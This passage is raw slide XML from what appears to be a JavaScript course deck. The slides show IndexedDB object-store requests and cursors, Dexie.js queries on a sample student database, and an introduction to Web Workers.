                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>objectStore</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transaction.objectStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request</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objectStore.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>key</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err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request.onerror</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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a: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Handle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errors</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err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request.onsuccess</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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a: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dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>request.result.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>propertyName</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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57E252BE-E376-48EA-86B3-820A7784F226}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Using Cursors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70D64D9B-581F-4344-AAD0-ECF263A349E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>objectStore.openCursor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onsuccess</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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event</a:t>
            </a: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a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cursor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>event.target.result</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if</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cursor</a:t>
            </a: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alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cursor.key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + " is " + cursor.value.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" i="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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cursor.continue</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else</a:t>
            </a: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alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("No </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>more</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>entries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI"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  }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</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itle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A77E574-4F81-4DF6-9CBD-17665183785E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Using IndexedDB with Dexie.js</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="180227" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7AD9849-3C74-4450-8FD3-C59325E9E742}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="5165725"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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 Define your database with compound index</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>db</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Dexie</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student_database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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db.version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(1).stores({</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students: '++id, [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName+firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600"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db.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>().catch(function (e) {</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console.log("Open failed: " + e);</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db.students.clear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(); // clear old data</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 Put some data into it</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db.students.put</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firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Tina", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Tester"});</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db.students.put</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firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Tim", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Tester"});</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db.students.put</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firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Tina", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Helpful"});</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db.students.put</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firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Jane", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "Jackson"});</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 query it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pP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db.students.orderBy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lastName+firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]").each(function(student) {</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console.log(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>student.firstName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+" "+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>student.lastName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1600" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    });</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73AC2473-E2FB-4F22-89E3-5A8BC77EF086}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Web Workers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181251" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D908E8C-03E3-4A44-B5F4-44907BBB22CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Traditionally JS programs were executing in just 1 thread and long calculations might cause unwanted pop-up modal windows</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Web workers allow background calculation in isolated threads without disturbing main thread</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>The worker code must be in separate file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Communication between a worker and its parent page (main program) is done using an message passing event model</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B7C7683-4462-4A7D-BD29-B671B836BF67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Web Worker Code Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B01362A-40CC-4ADE-98D6-E4EC966C335D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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 Main script</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>worker = new Worker('worker.js');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>worker.addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('message', function(e) {</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console.log('Worker said: ', </a:t>
            </a:r>
            <a:r>
